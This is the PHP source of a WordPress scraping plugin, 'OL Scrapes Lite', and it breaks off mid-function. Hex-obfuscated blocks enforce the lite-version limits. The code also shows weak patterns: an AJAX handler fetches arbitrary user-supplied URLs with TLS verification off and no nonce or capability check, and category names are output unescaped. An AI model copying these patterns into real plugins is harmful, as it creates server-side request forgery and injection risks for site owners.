<?php
if (!defined('ABSPATH')) {
	exit;
}

if (!function_exists('getimagesizefromstring')) {
    function getimagesizefromstring($string_data){
        $uri = 'data://application/octet-stream;base64,'  . base64_encode($string_data);
        return getimagesize($uri);
    }
}

class OL_Lite_Scrapes {

	public static $task_id = 0;

	public function remove_pings() {
		add_action('publish_post', array($this, 'remove_publish_pings'), 99999, 1);
		add_action('save_post', array($this, 'remove_publish_pings'), 99999, 1);
		add_action('updated_post_meta', array($this, 'remove_publish_pings_after_meta'), 9999, 2);
		add_action('added_post_meta', array($this, 'remove_publish_pings_after_meta'), 9999, 2);
	}

	public function remove_publish_pings_after_meta($meta_id, $object_id) {
		$is_automatic_post = get_post_meta($object_id, '_scrape_task_id', true);
		if (!empty($is_automatic_post)) {
			delete_post_meta($object_id, '_pingme');
			delete_post_meta($object_id, '_encloseme');
		}
	}

	public function remove_publish_pings($post_id) {
		$is_automatic_post = get_post_meta($post_id, '_scrape_task_id', true);
		if (!empty($is_automatic_post)) {
			delete_post_meta($post_id, '_pingme');
			delete_post_meta($post_id, '_encloseme');
		}
	}

	public function header_js_vars() {
		add_action("admin_head", array($this, "echo_js_vars"));
	}

	public function echo_js_vars() {
		echo "<script>var plugin_path = '" . plugins_url() . "';</script>";
	}

	public function add_admin_js_css() {
		add_action('admin_enqueue_scripts', array($this, "init_admin_js_css"));
	}

	public function init_admin_js_css($hook_suffix) {
		wp_enqueue_style("ol_lite_menu_css", plugins_url("assets/css/menu.css", dirname(__FILE__)), null, OL_LITE_VERSION);
		if (is_object(get_current_screen()) && get_current_screen()->post_type == 'scrape_lite') {
			if (in_array($hook_suffix, array('post.php', 'post-new.php'))) {
				wp_enqueue_script("ol_lite_fix_jquery", plugins_url("assets/js/fix_jquery.js", dirname(__FILE__)), null, OL_LITE_VERSION);
				wp_enqueue_script("ol_lite_jquery", plugins_url("libraries/jquery-2.2.4/jquery-2.2.4.min.js", dirname(__FILE__)), null, OL_LITE_VERSION);
				wp_enqueue_script("ol_lite_jquery_ui", plugins_url("libraries/jquery-ui-1.12.1.custom/jquery-ui.min.js", dirname(__FILE__)), null, OL_LITE_VERSION);
				wp_enqueue_script("ol_lite_bootstrap", plugins_url("libraries/bootstrap-3.3.7-dist/js/bootstrap.min.js", dirname(__FILE__)), null, OL_LITE_VERSION);
				wp_enqueue_script("ol_lite_angular", plugins_url("libraries/angular-1.5.8/angular.min.js", dirname(__FILE__)), null, OL_LITE_VERSION);
				wp_register_script("ol_lite_main_js", plugins_url("assets/js/main.js", dirname(__FILE__)), null, OL_LITE_VERSION);
                $translation_array = array(
                    'media_library_title' => __('Featured image', 'ol-scrapes-lite'),
                    'name' => __('Name', 'ol-scrapes-lite'),
                    'eg_name' => __('e.g. name', 'ol-scrapes-lite'),
                    'eg_value' => __('e.g. value', 'ol-scrapes-lite'),
                    'value' => __('Value', 'ol-scrapes-lite'),
                    'xpath_placeholder' => __("e.g. //div[@id='octolooks']", 'ol-scrapes-lite'),
                    'enter_valid' => __ ("Please enter a valid value.", 'ol-scrapes-lite'),
                    'attribute' => __("Attribute", "ol-scrapes-lite"),
                    'eg_href' => __("e.g. href", "ol-scrapes-lite"),
                    'eg_scrape_value' => __("e.g. [scrape_value]", "ol-scrapes-lite"),
                    'template' => __("Template", "ol-scrapes-lite"),
                    'btn_value' => __("value", "ol-scrapes-lite"),
                    'btn_calculate' => __("calculate", "ol-scrapes-lite"),
                    'btn_date' => __("date", "ol-scrapes-lite"),
                    'btn_source_url' => __("source url", "ol-scrapes-lite"),
                    'btn_product_url' => __("product url", "ol-scrapes-lite"),
                    'btn_cart_url' => __("cart url", "ol-scrapes-lite"),
                    'add_new_replace' => __("Add new find and replace rule", "ol-scrapes-lite"),
                    'enable_template' => __("Enable template", "ol-scrapes-lite"),
                    'enable_find_replace' => __("Enable find and replace rules", "ol-scrapes-lite"),
                    'find' => __("Find", "ol-scrapes-lite"),
                    'replace' => __("Replace", "ol-scrapes-lite"),
                    'eg_find' => __("e.g. find", "ol-scrapes-lite"),
                    'eg_replace' => __("e.g. replace", "ol-scrapes-lite"),
                    'select_taxonomy' => __("Please select a taxonomy", "ol-scrapes-lite"),
                    'source_url_not_valid' => __("Source URL is not valid.", "ol-scrapes-lite"),
                    'post_item_not_valid' => __("Post item is not valid.", "ol-scrapes-lite"),
                    'item_not_link' => __("Selected item is not a link", "ol-scrapes-lite"),
                    'item_not_image' => __("Selected item is not an image", "ol-scrapes-lite")
                );
                wp_localize_script('ol_lite_main_js', 'translate', $translation_array );
                wp_enqueue_script('ol_lite_main_js');
				wp_enqueue_style("ol_lite_main_css", plugins_url("assets/css/main.css", dirname(__FILE__)), null, OL_LITE_VERSION);
				wp_enqueue_media();
			}
			if (in_array($hook_suffix, array('edit.php'))) {
				wp_enqueue_script("ol_lite_view_js", plugins_url("assets/js/view.js", dirname(__FILE__)), null, OL_LITE_VERSION);
				wp_enqueue_style("ol_lite_view_css", plugins_url("assets/css/view.css", dirname(__FILE__)), null, OL_LITE_VERSION);
			}
		}
	}

	public function add_post_type() {
		add_action('init', array($this, 'register_post_type'));
	}

	public function register_post_type() {
		register_post_type('scrape_lite', array(
			'labels' => array(
				'name' => 'Scrapes Lite',
				'add_new' => __('Add New', 'ol-scrapes-lite'),
				'all_items' => __('All Scrapes', 'ol-scrapes-lite')
			),
			'public' => false,
			'publicly_queriable' => false,
			'show_ui' => true,
			'menu_position' => 26,
			'menu_icon' => '',
			'supports' => array('custom-fields'),
			'register_meta_box_cb' => array($this, 'register_scrape_meta_boxes'),
			'has_archive' => true,
			'rewrite' => false,
			'capability_type' => 'post'
		));
	}

	public function register_scrape_meta_boxes() {
        add_action('edit_form_after_title', array($this, "show_scrape_options_html"));
	}

	public function show_scrape_options_html() {
		global $post;
		global $wpdb;
		$post_object = $post;

		$post_types = array_merge(array('post'), get_post_types(array('_builtin' => false)));

		$post_types_metas = $wpdb->get_results("SELECT 
													p.post_type, pm.meta_key, pm.meta_value
												FROM
													$wpdb->posts p
													LEFT JOIN
													$wpdb->postmeta pm ON p.id = pm.post_id
												WHERE
													p.post_type IN('" . implode("','", $post_types) . "') AND pm.meta_key IS NOT NULL
												GROUP BY p.post_type , pm.meta_key
												ORDER BY p.post_type, pm.meta_key");

		$auto_complete = array();
		foreach ($post_types_metas as $row) {
			$auto_complete[$row->post_type][] = $row->meta_key;
		}
		require plugin_dir_path(__FILE__) . "../views/scrape-meta-box.php";
	}

	public function trash_post_handler() {
		add_action("wp_trash_post", array($this, "trash_scrape_task"));
	}

	public function trash_scrape_task($post_id) {
		$post = get_post($post_id);
		if ($post->post_type == "scrape_lite") {

			$timestamp = wp_next_scheduled("scrape_event_lite", array($post_id));

			wp_clear_scheduled_hook("scrape_event_lite", array($post_id));
			wp_unschedule_event($timestamp, "scrape_event_lite", array($post_id));

			update_post_meta($post_id, "scrape_workstatus", "waiting");
		}
	}

	public function save_post_handler() {
		add_action("save_post", array($this, "save_scrape_task"), 10, 2);
	}

	public function save_scrape_task($post_id, $post_object) {

        if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
            return;
        }

		if ($post_object->post_type == 'scrape_lite' && !defined("WP_IMPORTING")) {
			$post_data = $_POST;

			if (!empty($post_data)) {

				$vals = get_post_meta($post_id);
				foreach ($vals as $key => $val) {
					delete_post_meta($post_id, $key);
				}

                ${"\x47L\x4f\x42\x41\x4c\x53"}["\x77\x71\x72yxwr\x64"]="v\x61\x6c\x75e";${"\x47\x4c\x4f\x42\x41\x4cS"}["x\x71\x6crf\x69\x78\x67\x67w"]="\x61rr";${"G\x4c\x4f\x42\x41\x4cS"}["\x78\x65sn\x76\x78\x66\x62\x6by\x72"]="\x6bey";$qvrddmrsiez="\x70\x6fst_\x64\x61t\x61";$kmvwmxjlbs="\x76a\x6c\x75e";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6fv\x6eiu\x63\x78\x6c\x64t\x70"]="po\x73t\x5f\x64\x61\x74a";if($_POST["s\x63r\x61pe\x5f\x72un\x5f\x6c\x69\x6d\x69\x74"]>=10){${${"\x47\x4cO\x42\x41\x4c\x53"}["o\x76\x6e\x69u\x63x\x6cd\x74\x70"]}["s\x63r\x61p\x65_r\x75n\x5f\x6c\x69\x6d\x69\x74"]=10;}if($_POST["\x73cr\x61\x70\x65_\x74ype"]=="fee\x64"){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x68\x68q\x75\x64t\x62\x68"]="p\x6f\x73\x74_\x64\x61\x74\x61";${${"\x47L\x4fBAL\x53"}["\x6f\x76n\x69\x75\x63\x78\x6c\x64\x74\x70"]}["\x73\x63r\x61pe_\x74\x69tl\x65_\x74\x79\x70e"]="\x66\x65e\x64";${"GLO\x42AL\x53"}["tg\x73c\x6e\x64v\x6d\x64"]="po\x73\x74_d\x61\x74a";${${"\x47\x4c\x4fB\x41LS"}["ov\x6e\x69\x75\x63xl\x64\x74p"]}["\x73\x63r\x61\x70e_con\x74\x65nt\x5fty\x70e"]="fee\x64";${${"\x47\x4cO\x42\x41\x4c\x53"}["hhq\x75\x64\x74bh"]}["scr\x61\x70e_ex\x63er\x70\x74\x5f\x74ype"]="\x66e\x65d";if(${${"G\x4cOB\x41\x4cS"}["ov\x6ei\x75\x63\x78\x6c\x64t\x70"]}["s\x63\x72\x61pe_tag\x73_t\x79pe"]=="xpa\x74h"){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x62\x69\x71\x76\x6b\x77\x71\x6e"]="po\x73\x74\x5fd\x61ta";${${"\x47L\x4f\x42A\x4c\x53"}["bi\x71v\x6bw\x71n"]}["s\x63\x72\x61pe\x5fta\x67\x73\x5fty\x70\x65"]="\x63\x75\x73t\x6fm";}if(${${"\x47LO\x42A\x4cS"}["\x74g\x73\x63\x6e\x64\x76\x6d\x64"]}["\x73\x63rape\x5f\x64ate\x5f\x74\x79p\x65"]=="xpa\x74\x68"){${${"\x47L\x4f\x42\x41\x4c\x53"}["ov\x6e\x69u\x63xldt\x70"]}["s\x63\x72a\x70\x65_\x64\x61t\x65_\x74\x79\x70e"]="fee\x64";}if(${${"\x47LOB\x41\x4c\x53"}["o\x76\x6e\x69u\x63\x78ld\x74p"]}["sc\x72\x61\x70e_f\x65\x61\x74\x75r\x65d\x5f\x74\x79\x70\x65"]=="x\x70\x61\x74\x68"){${${"\x47\x4c\x4fBALS"}["\x6fvn\x69u\x63x\x6c\x64\x74\x70"]}["s\x63ra\x70\x65_\x66e\x61t\x75\x72e\x64_ty\x70\x65"]="f\x65e\x64";}}${"\x47\x4c\x4f\x42A\x4cS"}["\x77ucerj"]="\x6bey";foreach(${$qvrddmrsiez} as${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x77uc\x65rj"]}=>${$kmvwmxjlbs}){if(${${"\x47\x4c\x4f\x42A\x4cS"}["\x78es\x6e\x76\x78f\x62\x6b\x79r"]}=="s\x63\x72\x61\x70\x65_cu\x73\x74o\x6d_f\x69eld\x73"){${"G\x4c\x4f\x42\x41LS"}["\x77eyy\x6a\x76\x70\x6e\x75\x74"]="\x74i\x6d\x65\x73tam\x70";$uxgdxadpb="\x70\x6f\x73\x74\x5fi\x64";$pcodqsmm="v\x61\x6c\x75\x65";${"\x47L\x4fB\x41\x4cS"}["\x62ui\x71\x6fa\x6c"]="k\x65\x79";${"\x47L\x4f\x42\x41L\x53"}["jl\x6e\x6b\x75\x74\x6az\x62j"]="\x61\x72\x72";$xgysvi="v\x61\x6c\x75e";foreach(${$xgysvi} as${${"\x47\x4cO\x42\x41\x4cS"}["w\x65\x79\x79\x6av\x70\x6e\x75\x74"]}=>${${"\x47\x4c\x4f\x42\x41\x4cS"}["j\x6cnk\x75t\x6az\x62\x6a"]}){if(!isset(${${"G\x4c\x4f\x42\x41LS"}["\x78qlr\x66\x69\x78\x67\x67\x77"]}["templa\x74\x65\x5fs\x74\x61\x74\x75s"])){${"\x47\x4c\x4f\x42\x41L\x53"}["\x6feh\x6el\x68\x74e\x70\x66\x6a"]="t\x69\x6d\x65\x73\x74\x61m\x70";${${"\x47\x4c\x4f\x42\x41LS"}["\x77\x71\x72\x79\x78\x77\x72d"]}[${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x6f\x65\x68\x6e\x6c\x68te\x70\x66\x6a"]}]["\x74em\x70l\x61\x74\x65\x5fs\x74atu\x73"]="";}}update_post_meta(${$uxgdxadpb},${${"\x47\x4cO\x42\x41\x4cS"}["b\x75i\x71\x6f\x61\x6c"]},${$pcodqsmm});}else if(strpos(${${"\x47\x4c\x4f\x42\x41LS"}["\x78\x65s\x6e\x76\x78\x66\x62k\x79\x72"]},"sc\x72\x61\x70\x65\x5f")!==false){${"\x47\x4c\x4fB\x41\x4cS"}["e\x6de\x65c\x62\x61sj\x62"]="\x76\x61lu\x65";$chjkyqixd="\x70\x6fs\x74\x5f\x69d";update_post_meta(${$chjkyqixd},${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x78e\x73\x6e\x76\x78\x66\x62\x6b\x79\x72"]},${${"GL\x4f\x42\x41\x4c\x53"}["\x65\x6d\x65\x65c\x62a\x73\x6a\x62"]});}}


				$checkboxes = array(
					'scrape_unique_title',
					'scrape_unique_content',
					'scrape_unique_url',
					'scrape_allowhtml',
					'scrape_category',
					'scrape_download_images',
					'scrape_comment',
					'scrape_template_status',
					'scrape_finish_repeat_enabled',
					'scrape_title_template_status',
					'scrape_content_template_status',
					'scrape_excerpt_template_status',
				);

				foreach ($checkboxes as $cb) {
					if (!isset($post_data[$cb])) {
						update_post_meta($post_id, $cb, '');
					}
				}

				update_post_meta($post_id, 'scrape_workstatus', 'waiting');
				update_post_meta($post_id, 'scrape_run_count', 0);
				update_post_meta($post_id, 'scrape_start_time', '');
				update_post_meta($post_id, 'scrape_end_time', '');
				update_post_meta($post_id, 'scrape_task_id', $post_id);

				if (!isset($post_data['scrape_recurrance'])) {
					update_post_meta($post_id, 'scrape_recurrance', 'scrape_1 Month');
				}

				if ($post_object->post_status != "trash") {

					$this->handle_cron_job($post_id);

				}

				$errors = get_transient("scrape_msg");
				if (empty($errors) && isset($post_data['user_ID'])) {

					wp_redirect(add_query_arg('post_type', 'scrape_lite', admin_url('/edit.php')));
					exit;
				}
			} else {
				update_post_meta($post_id, 'scrape_workstatus', 'waiting');
			}
		} else if($post_object->post_type == 'scrape_lite' && defined("WP_IMPORTING")) {
			update_post_meta($post_id, 'scrape_workstatus', 'waiting');
			update_post_meta($post_id, 'scrape_run_count', 0);
			update_post_meta($post_id, 'scrape_start_time', '');
			update_post_meta($post_id, 'scrape_end_time', '');
			update_post_meta($post_id, 'scrape_task_id', $post_id);
		}
	}

	public function add_ajax_handler() {
		add_action("wp_ajax_" . "get_url_lite", array($this, "ajax_url_load"));
		add_action("wp_ajax_" . "get_post_cats_lite", array($this, "ajax_post_cats"));
		add_action("wp_ajax_" . "get_post_tax_lite", array($this, "ajax_post_tax"));
		add_action("wp_ajax_" . "get_tasks_lite", array($this, "ajax_tasks"));
	}

	public function ajax_tasks() {
		$all_tasks = get_posts(array(
			'numberposts' => -1,
			'post_type' => 'scrape_lite',
			'post_status' => 'publish'
		));

		$array = array();
		foreach ($all_tasks as $task) {
			$post_ID = $task->ID;

			clean_post_cache($post_ID);
			$post_status = get_post_status($post_ID);
			$scrape_status = get_post_meta($post_ID, 'scrape_workstatus', true);
			$run_limit = get_post_meta($post_ID, 'scrape_run_limit', true);
			$run_count = get_post_meta($post_ID, 'scrape_run_count', true);
			$status = '';
			$css_class = '';

			if ($post_status == 'trash') {
				$status = __("Deactivated", "ol-scrapes-lite");
				$css_class = "deactivated";
			} else if ($run_count == 0 && $scrape_status == 'waiting') {
				$status = __("Preparing", "ol-scrapes-lite");
				$css_class = "preparing";
			} else if (($run_count < $run_limit) && $scrape_status == 'waiting') {
				$status = __("Waiting next run", "ol-scrapes-lite");
				$css_class = "wait_next";
			} else if (((!empty($run_limit) && $run_count < $run_limit)) && $scrape_status == 'running') {
				$status = __("Running", "ol-scrapes-lite");
				$css_class = "running";
			} else if ($run_count == $run_limit && $scrape_status == 'waiting') {
				$status = __("Complete", "ol-scrapes-lite");
				$css_class = "complete";
			}

			$last_run = get_post_meta($post_ID, 'scrape_start_time', true) != "" ? get_post_meta($post_ID, 'scrape_start_time', true) : __("None", "ol-scrapes-lite");
			$last_complete = get_post_meta($post_ID, 'scrape_end_time', true) != "" ? get_post_meta($post_ID, 'scrape_end_time', true) : __("None", "ol-scrapes-lite");
			$run_count_progress = $run_count;
			$offset = get_option('gmt_offset') * 3600;
			$date = date("Y-m-d H:i:s", wp_next_scheduled("scrape_event_lite", array($post_ID)) + $offset);
			if (strpos($date, "1970-01-01") !== false) {
				$date = __("No Schedule", "ol-scrapes-lite");
			}
			$array[] = array(
				$task->ID,
				$css_class,
				$status,
				$last_run,
				$last_complete,
				$date,
				$run_count_progress
			);
		}

		echo json_encode($array);
		wp_die();
	}

	public function ajax_post_cats() {
		if (isset($_POST['post_type'])) {
			$post_type = $_POST['post_type'];
			$object_taxonomies = get_object_taxonomies($post_type);
			if ($post_type == 'post') {
				$cats = get_categories(array(
					'hide_empty' => 0
				));
			} else if (!empty($object_taxonomies)) {
				$cats = get_categories(array(
					'hide_empty' => 0,
					'taxonomy' => $object_taxonomies,
					'type' => $post_type
				));
			} else {
				$cats = array();
			}
			$scrape_category = get_post_meta($_POST['post_id'], 'scrape_category', true);
			foreach ($cats as $c) {
				echo '<div class="checkbox"><label><input type="checkbox" name="scrape_category[]" value="' . $c->cat_ID . '"' . (!empty($scrape_category) && in_array($c->cat_ID, $scrape_category) ? " checked" : "") . '> ' . $c->name . '<small> (' . get_taxonomy($c->taxonomy)->labels->name . ')</small></label></div>';
			}
			wp_die();
		}
	}

	public function ajax_post_tax() {
		if (isset($_POST['post_type'])) {
			$post_type = $_POST['post_type'];
			$object_taxonomies = get_object_taxonomies($post_type, "objects");
			$scrape_categoryxpath_tax = get_post_meta($_POST['post_id'], 'scrape_categoryxpath_tax', true);
			foreach ($object_taxonomies as $tax) {
				echo "<option value='$tax->name'" . ($tax->name == $scrape_categoryxpath_tax ? " selected" : "") . " >" . $tax->labels->name . "</option>";
			}
			wp_die();
		}
	}

    public function check_limit($post_id, $post){
        ${"G\x4c\x4f\x42\x41\x4cS"}["p\x61t\x67\x63y\x64\x64"]="\x70\x6fs\x74_i\x64";${"G\x4cO\x42\x41\x4c\x53"}["\x6f\x73\x64\x75\x7af"]="va\x6c\x75e";${"\x47\x4c\x4f\x42\x41LS"}["t\x6e\x78\x6d\x79\x75\x71"]="\x74\x68e\x5f\x71\x75\x65\x72\x79";if($post->post_type=="scr\x61pe_li\x74e"){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x67wn\x76\x62\x65h\x6c"]="\x61\x72\x67\x73";${"\x47\x4c\x4f\x42\x41L\x53"}["bhe\x61\x6f\x6e\x6f\x6en"]="a\x72\x67\x73";${${"\x47\x4c\x4f\x42A\x4c\x53"}["gw\x6e\x76\x62\x65\x68\x6c"]}=array("po\x73t\x5ft\x79\x70\x65"=>"s\x63\x72ap\x65_lit\x65");${${"\x47\x4c\x4f\x42\x41L\x53"}["\x74n\x78m\x79\x75q"]}=new WP_Query(${${"G\x4c\x4fB\x41\x4c\x53"}["\x62\x68\x65\x61o\x6e\x6f\x6e\x6e"]});if($the_query->found_posts>3){$aouujtebvd="\x6d\x65\x74\x61\x5fv\x61\x6c\x73";${"\x47LO\x42\x41LS"}["\x79u\x77\x77v\x77\x70\x6b\x66"]="\x70\x6fs\x74\x5f\x69\x64";$tfwvsiimq="\x6de\x74\x61\x5fv\x61l\x73";$hlkzzepb="po\x73t\x5fid";${$tfwvsiimq}=get_post_meta(${$hlkzzepb});$ntgefiwuq="k\x65y";foreach(${$aouujtebvd} as${$ntgefiwuq}=>${${"G\x4cO\x42\x41LS"}["osdu\x7a\x66"]}){${"G\x4c\x4f\x42\x41L\x53"}["a\x66eo\x66\x78\x68\x6bief"]="\x6be\x79";delete_post_meta(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x70\x61\x74\x67cy\x64\x64"]},${${"\x47LO\x42\x41\x4c\x53"}["\x61fe\x6f\x66\x78\x68\x6b\x69\x65f"]});}wp_delete_post(${${"G\x4cO\x42\x41\x4c\x53"}["\x79\x75\x77\x77vw\x70k\x66"]},true);set_transient("\x73\x63ra\x70\x65\x5f\x6d\x73g_\x6ci\x74\x65",array(__("You c\x61\x6e o\x6ely\x20have\x203 t\x61\x73\x6bs \x61\x74 \x74he\x20\x73\x61\x6de\x20ti\x6d\x65 wit\x68\x20<\x73\x74\x72o\x6e\x67>l\x69\x74e ver\x73\x69\x6fn\x3c/s\x74\x72\x6fn\x67\x3e\x2e","\x6fl-s\x63rap\x65s-\x6c\x69te")));}}
	}
    
	public function ajax_url_load() {
		if (isset($_GET['address'])) {

		    if(isset($_GET['scrape_feed'])) {
		        wp_die("This option is only in PRO version");
            }
			update_option('scrape_user_agent_lite', $_SERVER['HTTP_USER_AGENT']);
			$args = array(
				'sslverify' => false,
				'timeout' => 60,
				'user-agent' => get_option('scrape_user_agent_lite')
			);

			$request = wp_remote_get($_GET['address'], $args);

			if (is_wp_error($request)) {
				wp_die($request->get_error_message());
			}
			$body = wp_remote_retrieve_body($request);
			$body = trim($body);
			if (substr($body, 0, 3) == pack("CCC", 0xef, 0xbb, 0xbf)) {
				$body = substr($body, 3);
			}
			$dom = new DOMDocument();

			$charset = $this->detect_html_encoding_and_replace(wp_remote_retrieve_header($request, "Content-Type"), $body);
			$body = iconv($charset, "UTF-8//IGNORE", $body);

			if ($body === false) {
				wp_die("utf-8 convert error");
			}

			$body = preg_replace(
				array(
				"'<\s*script[^>]*[^/]>(.*?)<\s*/\s*script\s*>'is",
				"'<\s*script\s*>(.*?)<\s*/\s*script\s*>'is",
				"'<\s*noscript[^>]*[^/]>(.*?)<\s*/\s*noscript\s*>'is",
				"'<\s*noscript\s*>(.*?)<\s*/\s*noscript\s*>'is"
				), array(
				"",
				"",
				"",
				""
				), $body);

			$body = mb_convert_encoding($body, 'HTML-ENTITIES', 'UTF-8');
			@$dom->loadHTML('<?xml encoding="utf-8" ?>' . $body);
			$url = parse_url($_GET['address']);
			$url = $url['scheme'] . "://" . $url['host'];
			$head = $dom->getElementsByTagName('head')->item(0);
			$base = $dom->getElementsByTagName('base')->item(0);
			$html_base_url = null;
			if (!is_null($base)) {
				$html_base_url = $this->create_absolute_url($base->getAttribute('href'), $url);
			}


			$imgs = $dom->getElementsByTagName('img');
			if ($imgs->length) {
				foreach ($imgs as $item) {
					$item->setAttribute('src', $this->create_absolute_url(
							trim($item->getAttribute('src')), $_GET['address'], $html_base_url
					));
				}
			}

			$as = $dom->getElementsByTagName('a');
			if ($as->length) {
				foreach ($as as $item) {
					$item->setAttribute('href', $this->create_absolute_url(
							trim($item->getAttribute('href')), $_GET['address'], $html_base_url
					));
				}
			}

            $links = $dom->getElementsByTagName('link');
            if ($links->length) {
                foreach ($links as $item) {
                    $item->setAttribute('href', $this->create_absolute_url(
                        trim($item->getAttribute('href')), $_GET['address'], $html_base_url
                    ));
                }
            }

			$all_elements = $dom->getElementsByTagName('*');
			foreach ($all_elements as $item) {
				if ($item->hasAttributes()) {
					foreach ($item->attributes as $name => $attr_node) {
						if (preg_match("/^on\w+$/", $name)) {
							$item->removeAttribute($name);
						}
					}
				}
			}

			$html = $dom->saveHTML();
			echo $html;
			wp_die();
		}
	}

	public function create_cron_schedules() {
		add_filter('cron_schedules', array($this, 'add_custom_schedules'));
		add_action('scrape_event_lite', array($this, 'execute_post_task'));
	}

	public function add_custom_schedules($schedules) {
        $schedules['scrape_' . "5 Minutes"] = array(
            'interval' =>  5 * 60,
            'display' => __("5 Minutes", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "10 Minutes"] = array(
            'interval' =>  10 * 60,
            'display' => __("10 Minutes", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "15 Minutes"] = array(
            'interval' =>  15 * 60,
            'display' => __("15 Minutes", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "30 Minutes"] = array(
            'interval' =>  30 * 60,
            'display' => __("30 Minutes", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "45 Minutes"] = array(
            'interval' =>  45 * 60,
            'display' => __("45 Minutes", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "1 Hour"] = array(
            'interval' =>  60 * 60,
            'display' => __("1 Hour", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "2 Hours"] = array(
            'interval' =>  2 * 60 * 60,
            'display' => __("2 Hours", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "4 Hours"] = array(
            'interval' =>  4 * 60 * 60,
            'display' => __("4 Hours", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "6 Hours"] = array(
            'interval' =>  6 * 60 * 60,
            'display' => __("6 Hours", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "8 Hours"] = array(
            'interval' =>  8 * 60 * 60,
            'display' => __("8 Hours", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "12 Hours"] = array(
            'interval' =>  12 * 60 * 60,
            'display' => __("12 Hours", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "1 Day"] = array(
            'interval' =>  24 * 60 * 60,
            'display' => __("1 Day", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "1 Week"] = array(
            'interval' => 7 * 24 * 60 * 60,
            'display' => __("1 Week", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "2 Weeks"] = array(
            'interval' => 2 * 7 * 24 * 60 * 60,
            'display' => __("2 Weeks", "ol-scrapes-lite")
        );
        $schedules['scrape_' . "1 Month"] = array(
            'interval' => 30 * 24 * 60 * 60,
            'display' => __("1 Month", "ol-scrapes-lite")
        );

		return $schedules;
	}

	public static function handle_cron_job($post_id) {
		$cron_recurrance = get_post_meta($post_id, 'scrape_recurrance', true);
		$timestamp = wp_next_scheduled("scrape_event_lite", array($post_id));
		if ($timestamp) {
			wp_unschedule_event($timestamp, "scrape_event_lite", array($post_id));
			wp_clear_scheduled_hook("scrape_event_lite", array($post_id));
		}
		wp_schedule_event(time() + 10, $cron_recurrance, "scrape_event_lite", array($post_id));
	}

	public function execute_post_task($post_id) {
		if (function_exists('set_time_limit')) {
			$success = @set_time_limit(0);
			if (!$success) {
				if (function_exists('ini_set')) {
					$success = @ini_set('max_execution_time', 0);
					if (!$success) {

					}
				}
			}
		}
		if (strpos($_SERVER['SERVER_SOFTWARE'], "nginx") !== false) {
			fastcgi_finish_request();
		}


		self::$task_id = $post_id;

		clean_post_cache($post_id);

		$meta_vals = get_post_meta($post_id);

		if (!empty($meta_vals['scrape_run_count']) && !empty($meta_vals['scrape_run_limit']) &&
			$meta_vals['scrape_run_count'][0] >= $meta_vals['scrape_run_limit'][0]) {

			return;
		}
		if (!empty($meta_vals['scrape_workstatus']) && $meta_vals['scrape_workstatus'][0] == 'running' && $meta_vals['scrape_stillworking'][0] == 'wait') {

			return;
		}

		$start_time = current_time('mysql');
		$modify_time = get_post_modified_time('U', null, $post_id);
		update_post_meta($post_id, "scrape_start_time", $start_time);
		update_post_meta($post_id, "scrape_end_time", '');
		update_post_meta($post_id, 'scrape_workstatus', 'running');
		try {
			$finish_reason = $this->execute_scrape($post_id, $meta_vals, $start_time, $modify_time);
		} catch (Exception $e) {

		}
		update_post_meta($post_id, "scrape_run_count", $meta_vals['scrape_run_count'][0] + 1);
		if ($finish_reason != "terminate") {
			update_post_meta($post_id, 'scrape_workstatus', 'waiting');
			update_post_meta($post_id, "scrape_end_time", current_time('mysql'));
            delete_post_meta($post_id, 'scrape_last_url');
		}


	}

	public function single_scrape($url, $meta_vals, &$repeat_count = 0, $rss_item = null) {
		global $wpdb;

		$args = array(
			'timeout' => $meta_vals['scrape_timeout'][0],
			'sslverify' => false,
			'user-agent' => get_option('scrape_user_agent_lite')
		);


        $is_facebook_page = false;
        $is_amazon = false;

        if(parse_url($url, PHP_URL_HOST) == 'mbasic.facebook.com') {
            $is_facebook_page = true;
        }

        if(preg_match("/(\/|\.)amazon\./", $meta_vals['scrape_url'][0])) {
            $is_amazon = true;
        }
		$response = wp_remote_get($url, $args);

		if (!isset($response->errors)) {


			$body = $response['body'];
			$body = trim($body);

			if (substr($body, 0, 3) == pack("CCC", 0xef, 0xbb, 0xbf)) {
				$body = substr($body, 3);
			}

			$charset = $this->detect_html_encoding_and_replace(wp_remote_retrieve_header($response, "Content-Type"), $body);
			$body_iconv = iconv($charset, "UTF-8//IGNORE", $body);
			unset($body);
			$body_preg = preg_replace(
				array(
				'/(<table([^>]+)?>([^<>]+)?)(?!<tbody([^>]+)?>)/',
				'/(<(?!(\/tbody))([^>]+)?>)(<\/table([^>]+)?>)/',
				"'<\s*script[^>]*[^/]>(.*?)<\s*/\s*script\s*>'is",
				"'<\s*script\s*>(.*?)<\s*/\s*script\s*>'is",
				"'<\s*noscript[^>]*[^/]>(.*?)<\s*/\s*noscript\s*>'is",
				"'<\s*noscript\s*>(.*?)<\s*/\s*noscript\s*>'is"
				), array(
				'$1<tbody>',
				'$1</tbody>$4',
				"",
				"",
				"",
				""), $body_iconv);
			unset($body_iconv);


			$doc = new DOMDocument;
			$body_preg = mb_convert_encoding($body_preg, 'HTML-ENTITIES', 'UTF-8');
			@$doc->loadHTML('<?xml encoding="utf-8" ?>' . $body_preg);
			$xpath = new DOMXPath($doc);


			$base = $doc->getElementsByTagName('base')->item(0);
			$html_base_url = null;
			if (!is_null($base)) {
				$html_base_url = $base->getAttribute('href');
			}

			$ID = 0;

			$post_type = $meta_vals['scrape_post_type'][0];

			$post_date_type = $meta_vals['scrape_date_type'][0];
			if ($post_date_type == 'xpath') {
